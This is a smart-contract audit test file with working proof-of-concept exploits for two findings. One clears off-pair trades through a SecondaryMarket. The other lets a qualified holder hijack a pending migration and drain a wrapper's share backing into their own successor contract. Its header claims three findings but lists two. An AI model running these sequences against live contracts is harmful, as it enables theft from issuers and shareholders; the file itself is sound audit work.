import { expect } from "chai";
import { Contract } from "ethers";
import {
  connection,
  ethers,
  owner,
  signer1,
  signer2,
  signer3,
} from "../../../test/TestBase.ts";
import { deployFixture, mintAndWrap } from "../../../test/Fixtures.ts";
import { setBalance } from "../../../scripts/helpers/setBalance.ts";

// Follow-up market & share-token integrity audit (2026-08-11), branch `ai-audit` @ 0064dfb.
//
// Three confirmed findings:
//
//   Finding M-1 — SecondaryMarket.process never checks that the executed intents belong to the
//                 market's configured TOKEN<->CURRENCY pair. `validateOrder`/`executableAmount`
//                 reject off-pair intents with WrongTokens(), yet `process` executes them (it only
//                 relies on the reactor's cross-intent TokenMismatch check, which holds for ANY
//                 pair). With router == address(0) (the default), anyone can call `process` and
//                 clear off-pair orders through the issuer's market venue.
//   Finding M-2 — Modification._propose unconditionally overwrites a pending migration. The issuer's
//                 proposed termination can be silently replaced by any >10% holder with a migration
//                 to a successor contract of their choice; after the 20-day delay `executeMigration`
//                 then moves the ENTIRE wrapped base backing into that (attacker-controlled)
//                 successor. There is no OfferPending-style lock as in DragAlong.
//
// Ruled out (control): SecondaryMarket.placeOrder DOES work for market-generated intents — the
// reactor's verify() sees msg.sender == the market == the intent filler, so no InvalidFiller.

const DETERRENCE_FEE = ethers.parseEther("0.01");
const RECOVERY_DELAY = 184n * 24n * 60n * 60n;
const MIGRATION_PROPOSAL_DELAY = 20n * 24n * 60n * 60n;

interface Intent {
  owner: string;
  filler: string;
  tokenOut: string;
  amountOut: bigint;
  tokenIn: string;
  amountIn: bigint;
  creation: bigint;
  expiration: bigint;
  data: string;
}

function toPlain(intent: Intent): Intent {
  return {
    owner: intent.owner,
    filler: intent.filler,
    tokenOut: intent.tokenOut,
    amountOut: intent.amountOut,
    tokenIn: intent.tokenIn,
    amountIn: intent.amountIn,
    creation: intent.creation,
    expiration: intent.expiration,
    data: intent.data,
  };
}

function getSignature(signer: any, intent: Intent, verifyingContract: string) {
  const domain = {
    name: "TradeIntent",
    version: "1",
    chainId: connection.networkConfig.chainId,
    verifyingContract,
    salt: ethers.keccak256(ethers.toUtf8Bytes("aktionariat")),
  };
  const types = {
    Intent: [
      { name: "owner", type: "address" },
      { name: "filler", type: "address" },
      { name: "tokenOut", type: "address" },
      { name: "amountOut", type: "uint256" },
      { name: "tokenIn", type: "address" },
      { name: "amountIn", type: "uint256" },
      { name: "creation", type: "uint256" },
      { name: "expiration", type: "uint256" },
      { name: "data", type: "bytes" },
    ],
  };
  return signer.signTypedData(domain, types, toPlain(intent));
}

describe("Finding M-1 — SecondaryMarket.process executes off-pair trades that validateOrder rejects", function () {
  it("EXPLOIT: an XXX<->SHARES intent pair clears through a SHARES<->CURRENCY market", async function () {
    const { shares, sharesUnderAgreement, tradeReactor } =
      await connection.networkHelpers.loadFixture(deployFixture);
    const sharesAddr = await shares.getAddress();
    const reactorAddr = await tradeReactor.getAddress();

    const Shares = await ethers.getContractFactory(
      "contracts/shares/base/Shares.sol:Shares"
    );
    const offPair = await Shares.deploy(
      "XXX",
      "Off-Pair Token",
      "https://test.com/terms",
      owner
    );
    await offPair.waitForDeployment();
    const offPairAddr = await offPair.getAddress();
    await offPair.connect(owner).mint(signer1, 1000n);
    await shares.connect(owner).mint(signer2, 1000n);

    const market = await (
      await ethers.getContractFactory("SecondaryMarket")
    ).deploy(
      owner,
      sharesAddr,
      await sharesUnderAgreement.getAddress(),
      reactorAddr,
      ethers.ZeroAddress
    );
    await market.waitForDeployment();
    const marketAddr = await market.getAddress();

    const now = BigInt(await connection.networkHelpers.time.latest());
    const sellIntent: Intent = {
      owner: await signer1.getAddress(),
      filler: marketAddr,
      tokenOut: offPairAddr,
      amountOut: 10n,
      tokenIn: sharesAddr,
      amountIn: 150n,
      creation: now,
      expiration: now + 3600n,
      data: "0x",
    };
    const buyIntent: Intent = {
      owner: await signer2.getAddress(),
      filler: marketAddr,
      tokenOut: sharesAddr,
      amountOut: 150n,
      tokenIn: offPairAddr,
      amountIn: 10n,
      creation: now,
      expiration: now + 3600n,
      data: "0x",
    };
    const sellSig = await getSignature(signer1, sellIntent, reactorAddr);
    const buySig = await getSignature(signer2, buyIntent, reactorAddr);

    await offPair.connect(signer1).approve(reactorAddr, 1000n);
    await shares.connect(signer2).approve(reactorAddr, 1000n);

    // The market's own order validator rejects the off-pair intent...
    await expect(
      market.validateOrder(sellIntent, sellSig)
    ).to.be.revertedWithCustomError(market, "WrongTokens");

    // ...but process() executes it: the seller gets 148 shares (150 minus the 190bps fee), the
    // buyer gets the 10 off-pair tokens. Only the market's trading-fee accounting is affected.
    await expect(
      market
        .connect(signer3)
        .process(sellIntent, sellSig, buyIntent, buySig, 10n)
    ).to.not.revert(ethers);
    expect(await shares.balanceOf(await signer1.getAddress())).to.equal(148n);
    expect(await offPair.balanceOf(await signer2.getAddress())).to.equal(10n);
  });

  it("control: a same-pair intent executes and validateOrder accepts it", async function () {
    const { shares, sharesUnderAgreement, tradeReactor } =
      await connection.networkHelpers.loadFixture(deployFixture);
    const sharesAddr = await shares.getAddress();
    const reactorAddr = await tradeReactor.getAddress();

    // Self-contained currency (avoids forked-token balances): a second mintable token.
    const Shares = await ethers.getContractFactory(
      "contracts/shares/base/Shares.sol:Shares"
    );
    const currency = await Shares.deploy(
      "CHF2",
      "Fake CHF",
      "https://test.com/terms",
      owner
    );
    await currency.waitForDeployment();
    const currencyAddr = await currency.getAddress();

    const market = await (
      await ethers.getContractFactory("SecondaryMarket")
    ).deploy(owner, currencyAddr, sharesAddr, reactorAddr, ethers.ZeroAddress);
    await market.waitForDeployment();
    const marketAddr = await market.getAddress();

    const now = BigInt(await connection.networkHelpers.time.latest());
    const sellIntent: Intent = {
      owner: await signer1.getAddress(),
      filler: marketAddr,
      tokenOut: sharesAddr,
      amountOut: 10n,
      tokenIn: currencyAddr,
      amountIn: 150n,
      creation: now,
      expiration: now + 3600n,
      data: "0x",
    };
    const buyIntent: Intent = {
      owner: await signer2.getAddress(),
      filler: marketAddr,
      tokenOut: currencyAddr,
      amountOut: 150n,
      tokenIn: sharesAddr,
      amountIn: 10n,
      creation: now,
      expiration: now + 3600n,
      data: "0x",
    };
    const sellSig = await getSignature(signer1, sellIntent, reactorAddr);
    const buySig = await getSignature(signer2, buyIntent, reactorAddr);

    await shares.connect(owner).mint(signer1, 1000n);
    await currency.connect(owner).mint(signer2, 1000n);
    await shares.connect(signer1).approve(reactorAddr, 1000n);
    await currency.connect(signer2).approve(reactorAddr, 1000n);

    await expect(market.validateOrder(sellIntent, sellSig)).to.not.revert(
      ethers
    );
    await expect(
      market
        .connect(signer3)
        .process(sellIntent, sellSig, buyIntent, buySig, 10n)
    ).to.not.revert(ethers);
  });
});

describe("Finding M-2 — Modification._propose silently overwrites a pending migration", function () {
  it("EXPLOIT: a >10% holder redirects the issuer's termination to their own successor", async function () {
    const Shares = await ethers.getContractFactory(
      "contracts/shares/base/Shares.sol:Shares"
    );
    const shares = await Shares.deploy(
      "TST",
      "Test Company Shares",
      "https://test.com/terms",
      owner
    );
    await shares.waitForDeployment();
    const Sha = await ethers.getContractFactory(
      "contracts/shares/sha/SharesUnderAgreement.sol:SharesUnderAgreement"
    );
    const sha = await Sha.deploy(
      shares,
      "https://test.com/agreement",
      0,
      owner
    );
    await sha.waitForDeployment();

    // 20 wrapped tokens held by one holder: 20 > totalSupply(20)/10, so signer1 is qualified.
    await mintAndWrap(shares, sha, signer1, 20n);

    // The successor is a real wrapped-token contract deployed by the holder; its `wrap` pulls the
    // entire base backing out of the original wrapper on execution.
    const evil = await Sha.deploy(
      shares,
      "https://attacker.example/successor",
      0,
      signer1
    );
    await evil.waitForDeployment();
    const evilAddr = await evil.getAddress();

    // The issuer proposes a clean termination...
    await sha.connect(owner).proposeTermination();
    expect((await sha.migration()).migrationType).to.equal(3n);

    // ...and a qualified holder silently replaces it with a migration to their own successor.
    // No "migration already pending" check exists (contrast DragAlong's OfferPending).
    await sha.connect(signer1).proposeMigration(evil);
    const after = await sha.migration();
    expect(after.successor).to.equal(evilAddr);
    expect(after.migrationType).to.equal(1n);

    // After the 20-day delay the migration executes permissionlessly: the entire base backing
    // held by the wrapper is handed to the holder-chosen successor contract.
    await connection.networkHelpers.time.increase(
      MIGRATION_PROPOSAL_DELAY + 1n
    );
    await sha.connect(signer3).executeMigration();
    expect(await shares.balanceOf(sha)).to.equal(0n);
    expect(await shares.balanceOf(evilAddr)).to.equal(20n);
    expect(await sha.binding()).to.equal(false);
    expect(await sha.base()).to.equal(evilAddr);
  });

  it("control: only qualified parties can propose a migration", async function () {
    const Shares = await ethers.getContractFactory(
      "contracts/shares/base/Shares.sol:Shares"
    );
    const shares = await Shares.deploy(
      "TST",
      "Test Company Shares",
      "https://test.com/terms",
      owner
    );
    await shares.waitForDeployment();
    const Sha = await ethers.getContractFactory(
      "contracts/shares/sha/SharesUnderAgreement.sol:SharesUnderAgreement"
    );
    const sha = await Sha.deploy(
      shares,
      "https://test.com/agreement",
      0,
      owner
    );
    await sha.waitForDeployment();

    await mintAndWrap(shares, sha, signer1, 20n);

    const evil = await Shares.deploy(
      "EVIL",
      "Attacker Successor",
      "https://test.com/terms",
      owner
    );
    await evil.waitForDeployment();

    await expect(
      sha.connect(signer3).proposeMigration(evil)
    ).to.be.revertedWithCustomError(sha, "NotQualified");
  });
});
